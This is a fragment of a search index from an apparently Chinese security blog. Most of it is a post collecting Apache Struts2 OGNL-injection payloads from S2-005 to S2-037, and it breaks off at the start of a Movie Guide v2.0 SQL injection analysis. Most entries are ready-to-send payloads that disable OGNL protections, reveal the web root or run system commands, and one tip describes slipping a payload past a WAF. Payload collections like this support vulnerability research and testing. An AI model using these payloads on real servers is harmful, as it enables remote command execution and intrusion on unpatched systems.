}","title":"##   \u83b7\u53d6 web \u6839\u76ee\u5f55"},{"location":"blog/2017/struts2-history-payload/#_2","text":"% { ## a = ( new   java . lang . ProcessBuilder ( \" whoami \" ) ) . start ( ) , ## b = ## a . getInputStream ( ) , ## c = new   java . io . InputStreamReader ( ## b ) , ## d = new   java . io . BufferedReader ( ## c ) , ## e = new   char [ 50000 ] , ## d . read ( ## e ) , ## matt = ## context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) , ## matt . getWriter ( ) . println ( new   java . lang . String ( ## e ) ) , ## matt . getWriter ( ) . flush ( ) , ## matt . getWriter ( ) . close ( ) }","title":"##   \u6267\u884c \u7cfb\u7edf\u547d\u4ee4"},{"location":"blog/2017/struts2-history-payload/#struts2-s2-005","text":"\u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.1 . 8.1   \u6f0f\u6d1e \u8be6\u60c5 :   http : / / struts . apache . org / docs / s2 - 005 . html   struts2 \u6f0f\u6d1e \u7684 \u8d77\u6e90 \u6e90\u4e8e S2 - 003 ( \u53d7 \u5f71\u54cd \u7248\u672c :   \u4f4e\u4e8e Struts   2.0 . 12 ) \uff0c struts2 \u4f1a \u5c06 http \u7684 \u6bcf\u4e2a \u53c2\u6570 \u540d \u89e3\u6790 \u4e3a ongl \u8bed\u53e5 \u6267\u884c ( \u53ef \u7406\u89e3 \u4e3a java \u4ee3\u7801 ) \u3002 ongl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u901a\u8fc7 ## \u6765 \u8bbf\u95ee struts \u7684 \u5bf9\u8c61 \uff0c struts \u6846\u67b6 \u901a\u8fc7 \u8fc7\u6ee4 ## \u5b57\u7b26 \u9632\u6b62 \u5b89\u5168 \u95ee\u9898 \uff0c \u7136\u800c \u901a\u8fc7 unicode \u7f16\u7801 ( \\ u0023 ) \u6216 8 \u8fdb\u5236 ( \\ 43 ) \u5373 \u7ed5\u8fc7 \u4e86 \u5b89\u5168 \u9650\u5236 \uff0c \u5bf9\u4e8e S2 - 003 \u6f0f\u6d1e \uff0c \u5b98\u65b9 \u901a\u8fc7 \u589e\u52a0 \u5b89\u5168 \u914d\u7f6e ( \u7981\u6b62 \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5 \u8c03\u7528 \u548c \u7c7b \u65b9\u6cd5 \u6267\u884c \u7b49 ) \u6765 \u4fee\u8865 \uff0c \u4f46\u662f \u5b89\u5168 \u914d\u7f6e \u88ab \u7ed5\u8fc7 \u518d\u6b21 \u5bfc\u81f4 \u4e86 \u6f0f\u6d1e \uff0c \u653b\u51fb \u653b\u51fb\u8005 \u53ef\u4ee5 \u5229\u7528 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u8bb2 \u8fd9 2 \u4e2a \u9009\u9879 \u6253\u5f00 \uff0c S2 - 003 \u7684 \u4fee\u8865 \u65b9\u6848 \u628a \u81ea\u5df1 \u4e0a \u4e86 \u4e00\u4e2a \u9501 \uff0c \u4f46\u662f \u628a \u9501 \u94a5\u5319 \u7ed9 \u63d2 \u5728 \u4e86 \u9501 \u5934\u4e0a   \u4e0a\u6587 \u5f15\u7528   LittleHann   \u7684 \u63cf\u8ff0","title":"Struts2   S2 - 005"},{"location":"blog/2017/struts2-history-payload/#poc_1","text":"","title":"\u6784\u9020 PoC"},{"location":"blog/2017/struts2-history-payload/#web_1","text":"( ' \\ 43 _ memberAccess . allowStaticMethodAccess ' ) ( a ) = true & ( b ) ( ( ' \\ 43context [ \\ ' xwork . MethodAccessor . denyMethodExecution \\ ' ] \\ 75false ' ) ( b ) ) & ( ' \\ 43c ' ) ( ( ' \\ 43 _ memberAccess . excludeProperties \\ 75 @ java . util . Collections @ EMPTY _ SET ' ) ( c ) ) & ( g ) ( ( ' \\ 43req \\ 75 @ org . apache . struts2 . ServletActionContext @ getRequest ( ) ' ) ( d ) ) & ( i2 ) ( ( ' \\ 43xman \\ 75 @ org . apache . struts2 . ServletActionContext @ getResponse ( ) ' ) ( d ) ) & ( i97 ) ( ( ' \\ 43xman . getWriter ( ) . println ( \\ 43req . getRealPath ( % 22 \\ u005c% 22 ) ) ' ) ( d ) ) & ( i99 ) ( ( ' \\ 43xman . getWriter ( ) . close ( ) ' ) ( d ) )","title":"##   \u83b7\u53d6 web \u6839\u76ee\u5f55"},{"location":"blog/2017/struts2-history-payload/#_3","text":"( ' \\ 43 _ memberAccess . allowStaticMethodAccess ' ) ( a ) = true & ( b ) ( ( ' \\ 43context [ \\ ' xwork . MethodAccessor . denyMethodExecution \\ ' ] \\ 75false ' ) ( b ) ) & ( ' \\ 43c ' ) ( ( ' \\ 43 _ memberAccess . excludeProperties \\ 75 @ java . util . Collections @ EMPTY _ SET ' ) ( c ) ) & ( g ) ( ( ' \\ 43mycmd \\ 75 \\ ' \" + cmd + \" \\ ' ' ) ( d ) ) & ( h ) ( ( ' \\ 43myret \\ 75 @ java . lang . Runtime @ getRuntime ( ) . exec ( \\ 43mycmd ) ' ) ( d ) ) & ( i ) ( ( ' \\ 43mydat \\ 75new \\ 40java . io . DataInputStream ( \\ 43myret . getInputStream ( ) ) ' ) ( d ) ) & ( j ) ( ( ' \\ 43myres \\ 75new \\ 40byte [ 51020 ] ' ) ( d ) ) & ( k ) ( ( ' \\ 43mydat . readFully ( \\ 43myres ) ' ) ( d ) ) & ( l ) ( ( ' \\ 43mystr \\ 75new \\ 40java . lang . String ( \\ 43myres ) ' ) ( d ) ) & ( m ) ( ( ' \\ 43myout \\ 75 @ org . apache . struts2 . ServletActionContext @ getResponse ( ) ' ) ( d ) ) & ( n ) ( ( ' \\ 43myout . getWriter ( ) . println ( \\ 43mystr ) ' ) ( d ) )   \u4e0a\u9762 2 \u4e2a PoC \u6458\u81ea k8team \uff0c \u4e3a\u4e86 \u5199 PoC \uff0c \u6709\u6240 \u6539\u52a8 \uff0c \u4f46\u662f \u8fd9\u91cc \u5c31 \u4e0d \u4e0a\u6765 \u8d34\u4e0a\u6765 \u4e86 \uff1a \uff09","title":"##   \u6267\u884c \u7cfb\u7edf\u547d\u4ee4"},{"location":"blog/2017/struts2-history-payload/#struts2-s2-009","text":"\u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.3 . 1.1   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / struts . apache . org / docs / s2 - 009 . html   \u6f0f\u6d1e \u5229\u7528 \u70b9 \u8ddf S2 - 003 \u548c S2 - 005 \u7c7b\u4f3c \uff0c \u5229\u7528 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f ( 1 ) ( 2 ) , \u4f1a \u6267\u884c 1 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c 009 \u6784\u9020 \u4e86 \u7684 \u65b9\u6cd5 \u4e3a test = ( some   OGNL   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f ) ( 1 ) & z [ ( test ) ( 1 ) ] = true \u3002   z [ ( test ) ( 1 ) ] = true , \u5bf9 struts2 \u6765\u8bf4 \u662f \u5408\u6cd5 \u7684 \u53c2\u6570 \uff0c \u4f46\u662f ( test ) ( 1 ) \u4f1a \u6267\u884c \u4e0a\u8ff0 \u8bf4 \u7684 \u65b9\u6cd5 \uff0c test \u7684 \u503c \u88ab \u5e26\u5165 \u8ba1\u7b97 \uff0c \u9020\u6210 \u547d\u4ee4 \u6267\u884c \u3002","title":"Struts2   S2 - 009"},{"location":"blog/2017/struts2-history-payload/#poc_2","text":"","title":"\u6784\u9020 PoC"},{"location":"blog/2017/struts2-history-payload/#_4","text":"ps : \u5b9e\u9a8c \u73af\u5883 \u8bd5 \u4e86 \u597d \u51e0\u6b21 \u90fd \u4e0d\u80fd \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4 \uff0c \u8def\u8fc7 \u7684 \u5927\u4f6c \u6c42 \u6307\u6559 \uff1a \uff09   person . name = ( ## context [ \" xwork . MethodAccessor . denyMethodExecution \" ] =   new   java . lang . Boolean ( false ) ,   ##_ memberAccess [ \" allowStaticMethodAccess \" ] =   new   java . lang . Boolean ( true ) ,   @ java . lang . Runtime @ getRuntime ( ) . exec ( ' open   / Applications / Calculator . app ' ) ) ( meh ) & z [ ( person . name ) ( ' meh ' ) ] = true   \u7528 \u7684 \u662f   person / new - person . action   \u8fd9\u4e2a \u63a7\u5236 \u63a7\u5236\u5668","title":"##   \u5f39 \u8ba1\u7b97\u5668"},{"location":"blog/2017/struts2-history-payload/#web_2","text":"person . name = % 28% 23context% 5B% 22xwork . MethodAccessor . denyMethodExecution% 22% 5D% 3D% 20new% 20java . lang . Boolean% 28false% 29% 2C% 23 _ memberAccess% 5B% 22allowStaticMethodAccess% 22% 5D% 3Dtrue% 2C% 23req% 3D @ org . apache . struts2 . ServletActionContext @ getRequest% 28% 29% 2C% 23outstr% 3D @ org . apache . struts2 . ServletActionContext @ getResponse% 28% 29 . getWriter% 28% 29% 2C% 23outstr . println% 28% 27webpath% 3A% 27% 2b% 23req . getRealPath% 28% 22% 2f% 22% 29% 29% 2C% 23outstr . close% 28% 29% 29% 28meh% 29 & z% 5B% 28person . name% 29% 28% 27meh% 27% 29% 5D \"","title":"##   \u83b7\u53d6 web \u6839\u76ee\u5f55"},{"location":"blog/2017/struts2-history-payload/#struts2-s2-012","text":"\u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.3 . 13   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / cwiki . apache . org / confluence / display / WW / S2 - 012   Action   \u4e2d   Result   \u65f6 \u4f7f\u7528 \u4e86 \u5b9a\u5411 \u91cd\u5b9a\u5411 \u7c7b\u578b \uff0c \u5e76\u4e14 \u8fd8 \u4f7f\u7528   $ { param _ name }   \u4f5c\u4e3a \u5b9a\u5411 \u91cd\u5b9a\u5411 \u53d8\u91cf , struts \u5728 \u83b7\u53d6 \u5176\u503c \u65f6\u4f1a \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u4ece\u800c \u9020\u6210 \u547d\u4ee4 \u6267\u884c","title":"Struts2   S2 - 012"},{"location":"blog/2017/struts2-history-payload/#poc_3","text":"","title":"\u6784\u9020 PoC"},{"location":"blog/2017/struts2-history-payload/#web_3","text":"% 25% 7B% 28% 23context% 5B% 27xwork . MethodAccessor . denyMethodExecution% 27% 5D% 3Dfalse% 29% 28% 23 _ memberAccess% 5B% 27allowStaticMethodAccess% 27% 5D% 3Dtrue% 29% 28% 23req% 3D% 23context . get% 28% 27com . opensymphony . xwork2 . dispatcher . HttpServletRequest% 27% 29% 2C% 23response% 3D% 23context . get% 28% 22com . opensymphony . xwork2 . dispatcher . HttpServletResponse% 22% 29 . getWriter% 28% 29% 2C% 23response . println% 28% 27webpath% 3A% 27% 2b% 23req . getSession% 28% 29 . getServletContext% 28% 29 . getRealPath% 28% 27% 2f% 27% 29% 29% 2C% 23response . flush% 28% 29% 2C% 23response . close% 28% 29% 29% 7D","title":"##   \u83b7\u53d6 web \u6839 \u8def\u5f84"},{"location":"blog/2017/struts2-history-payload/#_5","text":"% 25% 7B% 28% 23context% 5B% 27xwork . MethodAccessor . denyMethodExecution% 27% 5D% 3Dfalse% 29% 28% 23 _ memberAccess% 5B% 27allowStaticMethodAccess% 27% 5D% 3Dtrue% 29% 28% 23a% 3D% 28new% 20java . lang . ProcessBuilder% 28% 27whoami% 27% 29% 29 . start% 28% 29% 2C% 23b% 3D% 23a . getInputStream% 28% 29% 2C% 23c% 3Dnew% 20java . io . InputStreamReader% 28% 23b% 29% 2C% 23d% 3Dnew% 20java . io . BufferedReader% 28% 23c% 29% 2C% 23e% 3Dnew% 20char% 5B50000% 5D% 2C% 23d . read% 28% 23e% 29% 2C% 23matt% 3D% 23context . get% 28% 27com . opensymphony . xwork2 . dispatcher . HttpServletResponse% 27% 29% 2C% 23matt . getWriter% 28% 29 . println% 28% 27dbapp% 3A% 27% 2bnew% 20java . lang . String% 28% 23e% 29% 29% 2C% 23matt . getWriter% 28% 29 . flush% 28% 29% 2C% 23matt . getWriter% 28% 29 . close% 28% 29% 29% 7D% 0A% 0A","title":"##   \u6267\u884c \u7cfb\u7edf\u547d\u4ee4"},{"location":"blog/2017/struts2-history-payload/#struts2-s2-013s2-014","text":"\u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.3 . 14.1   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / cwiki . apache . org / confluence / display / WW / S2 - 013 , https : / / cwiki . apache . org / confluence / display / WW / S2 - 014   \u6807\u7b7e   s : url   \u548c   s : a   \u4e2d \u63d0\u4f9b include \u53c2\u6570 \uff0c \u5176 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \u53ef\u4ee5 \u4e3a   none   -   include   no   parameters   in   the   URL   ( default )   get   -   include   only   GET   parameters   in   the   URL   all   -   include   both   GET   and   POST   parameters   in   the   URL   \u5982\u679c \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \u4e3a get \u6216 all \uff0c \u5728 \u83b7\u53d6 \u5bf9\u5e94 \u7684 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \u65f6 \u6267\u884c \u4e86 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f","title":"Struts2   S2 - 013 / S2 - 014"},{"location":"blog/2017/struts2-history-payload/#poc_4","text":"","title":"\u6784\u9020 PoC"},{"location":"blog/2017/struts2-history-payload/#web_4","text":"a = $ { ( % 23 _ memberAccess [ \" allowStaticMethodAccess \" ] = true , % 23req = @ org . apache . struts2 . ServletActionContext @ getRequest ( ) , % 23out = @ org . apache . struts2 . ServletActionContext @ getResponse ( ) . getWriter ( ) , % 23out . println ( ' webpath% 3a ' % 2b% 23req . getRealPath ( \" / \" ) ) , % 23out . close ( ) ) }","title":"##   \u83b7\u53d6 web \u6839\u76ee\u5f55"},{"location":"blog/2017/struts2-history-payload/#_6","text":"a = $ { ( % 23 _ memberAccess [ \" allowStaticMethodAccess \" ] = true , % 23a = @ java . lang . Runtime @ getRuntime ( ) . exec ( ' \" + cmd + \" ' ) . getInputStream ( ) , % 23b = new + java . io . InputStreamReader ( % 23a ) , % 23c = new + java . io . BufferedReader ( % 23b ) , % 23d = new + char [ 50000 ] , % 23c . read ( % 23d ) , % 23out = @ org . apache . struts2 . ServletActionContext @ getResponse ( ) . getWriter ( ) , % 23out . println ( ' dbapp% 3a ' % 2bnew   java . lang . String ( % 23d ) ) , % 23out . close ( ) ) }","title":"##   \u6267\u884c \u7cfb\u7edf\u547d\u4ee4"},{"location":"blog/2017/struts2-history-payload/#struts2-s2-016","text":"\u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.3 . 15   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / struts . apache . org / docs / s2 - 016 . html   \u200b   DefaultActionMapper   \u7c7b \u652f\u6301 \u4ee5   action : \uff0c redirect :   \u548c   redirectAction :   \u4f5c\u4e3a \u8bbf\u95ee \u524d\u7f00 \uff0c \u524d\u7f00 \u540e\u9762 \u53ef\u4ee5 \u8ddf   OGNL   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u7531\u4e8e   Struts2   \u672a \u5bf9 \u5176 \u8fdb\u884c \u8fc7\u6ee4 \uff0c \u5bfc\u81f4 \u4efb\u610f   Action   \u53ef\u4ee5 \u4f7f\u7528 \u8fd9\u4e9b \u524d\u7f00 \u6267\u884c \u4efb\u610f   OGNL   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u4ece\u800c \u5bfc\u81f4 \u4efb\u610f \u547d\u4ee4 \u6267\u884c   \u4e0a\u6587 \u5f15\u7528   rickgray   \u7684 \u63cf\u8ff0 \u3002","title":"Struts2   S2 - 016"},{"location":"blog/2017/struts2-history-payload/#poc_5","text":"","title":"\u6784\u9020 PoC"},{"location":"blog/2017/struts2-history-payload/#web_5","text":"? redirect : $ { ## req = ## context . get ( ' co ' + ' m . open ' + ' symphony . xwo ' + ' rk2 . disp ' + ' atcher . HttpSer ' + ' vletReq ' + ' uest ' ) , ## resp = ## context . get ( ' co ' + ' m . open ' + ' symphony . xwo ' + ' rk2 . disp ' + ' atcher . HttpSer ' + ' vletRes ' + ' ponse ' ) , ## resp . setCharacterEncoding ( ' UTF - 8 ' ) , ## ot = ## resp . getWriter   ( ) , ## ot . print ( ' web ' ) , ## ot . print ( ' path : ' ) , ## ot . print ( ## req . getSession ( ) . getServletContext ( ) . getRealPath ( ' / ' ) ) , ## ot . flush ( ) , ## ot . close ( ) }","title":"##   \u83b7\u53d6 web \u6839\u76ee\u5f55"},{"location":"blog/2017/struts2-history-payload/#_7","text":"? redirect : $ { ## a = ( new   java . lang . ProcessBuilder ( new   java . lang . String [ ] { ' whoami ' } ) ) . start ( ) , ## b = ## a . getInputStream ( ) , ## c = new   java . io . InputStreamReader ( ## b ) , ## d = new   java . io . BufferedReader ( ## c ) , ## e = new   char [ 50000 ] , ## d . read ( ## e ) , ## matt = ## context . get ( ' co ' + ' m . ope ' + ' nsymph ' + ' ony . x ' + ' wor ' + ' k2 . disp ' + ' atch ' + ' er . HttpSe ' + ' rvletRe ' + ' sponse ' ) , ## matt . getWriter ( ) . println ( new   java . lang . String ( ## e ) ) , ## matt . getWriter ( ) . flush ( ) , ## matt . getWriter ( ) . close ( ) } '   \u8fd8\u6709 \u4e00\u79cd \u6bd4\u8f83 \u9690\u853d \u7684 \u65b9\u6cd5 \uff0c \u5c06 PoC \u653e\u5728 \u6587\u4ef6 \u4e0a\u4f20 \u7684 name \u5904 \uff0c \u8fc7 waf \u3002","title":"##   \u6267\u884c \u7cfb\u7edf\u547d\u4ee4"},{"location":"blog/2017/struts2-history-payload/#struts2-s2-019","text":"\u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.3 . 15.1   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / cwiki . apache . org / confluence / display / WW / S2 - 019   \u8be5 \u6f0f\u6d1e \u6210 \u56e0\u4e3a \u5f00\u542f \u4e86 \u5f00\u53d1 \u5f00\u53d1\u8005 \u6a21\u5f0f \uff0c \u4f20\u5165   debug = command & expression =   \u5bfc\u81f4 \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u4ece\u800c \u9020\u6210 \u547d\u4ee4 \u6267\u884c \u6f0f\u6d1e \u3002","title":"Struts2   S2 - 019"},{"location":"blog/2017/struts2-history-payload/#poc_6","text":"","title":"\u6784\u9020 PoC"},{"location":"blog/2017/struts2-history-payload/#web_6","text":"debug = command & expression = % 23req% 3D% 23context . get% 28% 27com . opensymphony . xwork2 . dispatcher . HttpServletRequest% 27% 29% 2C% 23resp% 3D% 23context . get% 28% 27com . opensymphony . xwork2 . dispatcher . HttpServletResponse% 27% 29% 2C% 23resp . setCharacterEncoding% 28% 27UTF - 8% 27% 29% 2C% 23resp . getWriter% 28% 29 . println% 28% 27webpath% 3A% 27% 2b% 23req . getSession% 28% 29 . getServletContext% 28% 29 . getRealPath% 28% 27% 2f% 27% 29% 29% 2C% 23resp . getWriter% 28% 29 . flush% 28% 29% 2C% 23resp . getWriter% 28% 29 . close% 28% 29","title":"##   \u83b7\u53d6 web \u6839 \u8def\u5f84"},{"location":"blog/2017/struts2-history-payload/#_8","text":"debug = command & expression = % 23a% 3D% 28new% 20java . lang . ProcessBuilder% 28% 27whoami% 27% 29% 29 . start% 28% 29% 2C% 23b% 3D% 23a . getInputStream% 28% 29% 2C% 23c% 3Dnew% 20java . io . InputStreamReader% 28% 23b% 29% 2C% 23d% 3Dnew% 20java . io . BufferedReader% 28% 23c% 29% 2C% 23e% 3Dnew% 20char% 5B50000% 5D% 2C% 23d . read% 28% 23e% 29% 2C% 23out% 3D% 23context . get% 28% 27com . opensymphony . xwork2 . dispatcher . HttpServletResponse% 27% 29% 2C% 23out . getWriter% 28% 29 . println% 28% 27dbapp% 3A% 27% 2bnew% 20java . lang . String% 28% 23e% 29% 29% 2C% 23out . getWriter% 28% 29 . flush% 28% 29% 2C% 23out . getWriter% 28% 29 . close% 28% 29% 0A","title":"##   \u6267\u884c \u7cfb\u7edf\u547d\u4ee4"},{"location":"blog/2017/struts2-history-payload/#struts2-s2-032","text":"\u5f71\u54cd \u7248\u672c :   2.3 . 20   -   2.3 . 28   ( except   2.3 . 20.3   and   2.3 . 24.3 )   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / struts . apache . org / docs / s2 - 032 . html   \u5728 \u914d\u7f6e \u4e86   Struts2   DMI   \u4e3a   True   \u7684 \u60c5\u51b5 \u4e0b \uff0c \u53ef\u4ee5 \u4f7f\u7528   method :   Action   \u524d\u7f00 \u53bb \u8c03\u7528 \u58f0\u660e \u4e3a   public   \u7684 \u51fd\u6570 \uff0c DMI   \u7684 \u76f8\u5173 \u4f7f\u7528 \u65b9\u6cd5 \u53ef \u53c2\u8003 \u5b98\u65b9 \u4ecb\u7ecd \uff08 Dynamic   Method   Invocation \uff09 \uff0c \u8fd9\u4e2a   DMI   \u7684 \u8c03\u7528 \u7279\u6027 \u5176\u5b9e \u4e00\u76f4 \u5b58\u5728 \uff0c \u4e0d\u8fc7 \u53ea\u4e0d\u8fc7 \u5728 \u4f4e\u7248 \u7248\u672c \u4f4e\u7248\u672c \u4e2d   Strtus2   \u4e0d\u4f1a \u5bf9   name   \u65b9\u6cd5 \u503c \u505a   OGNL   \u8ba1\u7b97 \uff0c \u800c \u5728 \u9ad8 \u7248\u672c \u4e2d \u4f1a \uff0c \u4ee3\u7801 \u8be6\u60c5 \u53ef \u53c2\u8003 \u963f\u5c14\u6cd5 \u5b9e\u9a8c \u5b9e\u9a8c\u5ba4 \u7684 \u62a5\u544a   -   \u300a Apache   Struts2   s2 - 032 \u6280\u672f \u5206\u6790 \u53ca \u6f0f\u6d1e \u68c0\u6d4b \u811a\u672c \u300b   \u4e0a\u6587 \u5f15\u7528   rickgray   \u7684 \u63cf\u8ff0 \u3002","title":"Struts2   S2 - 032"},{"location":"blog/2017/struts2-history-payload/#poc_7","text":"","title":"\u6784\u9020 PoC"},{"location":"blog/2017/struts2-history-payload/#web_7","text":"? method : ##_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS , ## req = ## context . get ( ## parameters . a [ 0 ] ) , ## resp = ## context . get ( ## parameters . b [ 0 ] ) , ## resp . setCharacterEncoding ( ## parameters . c [ 0 ] ) , ## ot = ## resp . getWriter   ( ) , ## ot . print ( ## parameters . e [ 0 ] +## req . getSession ( ) . getServletContext ( ) . getRealPath ( ## parameters . d [ 0 ] ) ) , ## ot . flush ( ) , ## ot . close & a = com . opensymphony . xwork2 . dispatcher . HttpServletRequest & b = com . opensymphony . xwork2 . dispatcher . HttpServletResponse & c = UTF - 8 & d = / & e = webpath :","title":"##   \u83b7\u53d6 web \u6839\u76ee\u5f55"},{"location":"blog/2017/struts2-history-payload/#_9","text":"? method : ##_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS , ## a = ( new   java . lang . ProcessBuilder ( ## parameters . a [ 0 ] ) ) . start ( ) , ## b = ## a . getInputStream ( ) , ## c = new   java . io . InputStreamReader ( ## b ) , ## d = new   java . io . BufferedReader ( ## c ) , ## e = new   char [ 50000 ] , ## d . read ( ## e ) , ## matt = ## context . get ( ## parameters . b [ 0 ] ) , ## matt . getWriter ( ) . println ( ## parameters . c [ 0 ] + new   java . lang . String ( ## e ) ) , ## matt . getWriter ( ) . flush ( ) , ## matt . getWriter ( ) . close & a = whoami & b = com . opensymphony . xwork2 . dispatcher . HttpServletResponse & c = flag :","title":"##   \u6267\u884c \u7cfb\u7edf\u547d\u4ee4"},{"location":"blog/2017/struts2-history-payload/#struts2-s2-037","text":"\u5f71\u54cd \u7248\u672c :   2.3 . 20   -   2.3 . 28.1   \u6f0f\u6d1e \u8be6\u60c5 :   http : / / struts . apache . org / docs / s2 - 037 . html   \u8fd9\u4e2a \u6f0f\u6d1e \u548c \u4e4b\u524d S2 - 032 / 033 \u662f \u4e00\u4e2a \u5730\u65b9 \uff0c \u90fd \u662f \u5728 DefaultActionInvocation . java \u7684 invokeAction \u65b9\u6cd5 \u4e2d \u6ca1\u6709 \u5bf9\u4e8e methodName \u53c2\u6570 \u5185\u5bb9 \u8fdb\u884c \u6821\u9a8c \uff0c \u4fbf \u76f4\u63a5 \u4e22\u5230 \u4e86 getValue \u65b9\u6cd5 \u91cc\u9762 \uff0c \u4ece\u800c \u9020\u6210 Ongl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6ce8\u5165 \u3002   \u4e0a\u6587 \u5f15\u7528   nsfocus   \u7684 \u63cf\u8ff0","title":"Struts2   S2 - 037"},{"location":"blog/2017/struts2-history-payload/#poc_8","text":"","title":"\u6784\u9020 PoC"},{"location":"blog/2017/struts2-history-payload/#web_8","text":"/ ( ##_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS ) ? ( ## req = ## context . get ( ## parameters . a [ 0 ] ) , ## resp = ## context . get ( ## parameters . b [ 0 ] ) , ## resp . setCharacterEncoding ( ## parameters . c [ 0 ] ) , ## ot = ## resp . getWriter   ( ) , ## ot . print ( ## parameters . e [ 0 ] +## req . getSession ( ) . getServletContext ( ) . getRealPath ( ## parameters . d [ 0 ] ) ) , ## ot . flush ( ) , ## ot . close ) : xx . toString . json ? & a = com . opensymphony . xwork2 . dispatcher . HttpServletRequest & b = com . opensymphony . xwork2 . dispatcher . HttpServletResponse & c = UTF - 8 & d = / & e = webpath :","title":"##   \u83b7\u53d6 web \u6839\u76ee\u5f55"},{"location":"blog/2017/struts2-history-payload/#_10","text":"/ ( ##_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS ) ? ( ## a = ( new   java . lang . ProcessBuilder ( ## parameters . a [ 0 ] ) ) . start ( ) , ## b = ## a . getInputStream ( ) , ## c = new   java . io . InputStreamReader ( ## b ) , ## d = new   java . io . BufferedReader ( ## c ) , ## e = new   char [ 50000 ] , ## d . read ( ## e ) , ## matt = ## context . get ( ## parameters . b [ 0 ] ) , ## matt . getWriter ( ) . println ( ## parameters . c [ 0 ] + new   java . lang . String ( ## e ) ) , ## matt . getWriter ( ) . flush ( ) , ## matt . getWriter ( ) . close ( ) ) : xx . toString . json ? & a = whoami & b = com . opensymphony . xwork2 . dispatcher . HttpServletResponse & c = flag :","title":"##   \u6267\u884c \u7cfb\u7edf\u547d\u4ee4"},{"location":"blog/2017/struts2-history-payload/#_11","text":"Struts2 \u547d\u4ee4 \u6267\u884c \u7b97\u662f \u4e00\u4e2a \u6bd4\u8f83 \u7ecf\u5178 \u7684 \u6f0f\u6d1e \u4e86 \uff0c \u5e0c\u671b \u4ee5\u540e \u6df1\u5165 java \u7684 \u4e00\u4e9b \u6846\u67b6 \uff0c \u53ef\u4ee5 \u4ece \u5e95\u5c42 \u6765 \u5206\u6790 \uff1a \uff09","title":"\u603b\u7ed3"},{"location":"blog/2018/MovieGuide2SQLi-20180203/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"0x00   Detail :   Movie   Guide   v2.0   SQL   Injection   0x01   \u8fd9\u662f \u4e00\u4e2a \u6bd4\u8f83 \u7c97\u7cd9 \u7684 \u5f00\u6e90 cms \uff0c \u603b\u4f53 \u6765\u8bf4 \u5e76 \u6ca1\u6709 \u5bf9 \u8f93\u5165 \u8f93\u51fa \u8f93\u5165\u8f93\u51fa \u505a \u5b89\u5168 \u5904\u7406 \uff0c \u4ece PoC \u5165\u624b \uff0c \u9009 \u4e00\u4e2a \u8fd8\u539f \u4e00\u4e0b \u6f0f\u6d1e \u5f62\u6210 \u8fc7\u7a0b \u3002   PoC \uff1a index . php ? md = [ SQL ]   \u5b9a\u4f4d \u4e00\u4e0b md \u53c2\u6570   layout . php \u4e3a \u8be5 cms \u7684 \u4e3b\u8981 \u5165\u53e3 \u5904\u7406 , \u4e0b\u8ff0 \u7684 \u53d8\u91cf \u5747 \u6ca1\u6709 \u901a\u8fc7 \u5b89\u5168 \u5904\u7406 \uff0c \u76f4\u63a5 SQL \u8bed\u53e5 \uff0c \u4ece\u800c \u90fd \u53ef\u4ee5 \u7528\u4e8e \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u6ce8\u5165 \u3002   / / Get   the   passed   variables .   $ mterm   =   filter _ input ( INPUT _ POST ,   ' tterm ' ) ;   $ cterm   =   filter _ input ( INPUT _ POST ,   ' gterm ' ) ;   $ lterm   =   filter _ input ( INPUT _ GET ,   ' gterm ' ) ;   $ yterm   =   filter _ input ( INPUT _ GET ,   ' year ' ) ;   $ md   =   filter _ input ( INPUT _ GET ,   ' md ' ) ;   $ actorname   =   filter _ input ( INPUT _ GET ,   ' actor ' ) ;   $ directorname   =   filter _ input ( INPUT _ GET ,   ' director ' ) ;   \u76f4\u63a5 \u62fc\u63a5 \u5165 SQL \u8bed\u53e5   $ sql   =   \" SELECT   *   FROM   ` Movie _ List `   WHERE   ` Main _ Dir `   LIKE   ' \"   .   $ md   .   \" '   ORDER   BY   ` Movie _ Title `   ASC   Limit   $ start ,   $ perpage \" ;   \u8fd9\u91cc \u6bd4\u8f83 \u6709\u610f \u610f\u601d \u6709\u610f\u601d \u7684 \u662f \u5b83 \u7684 PoC \uff0c \u4ee5\u524d \u6ca1\u6709 \u89c1\u8fc7 \u7c7b\u4f3c \u7684 : b \uff0c PoC \u4e2d \u4f7f\u7528 \u4e86 export _ set \u51fd\u6570   EXPORT _ SET ( bits , on , off [ , 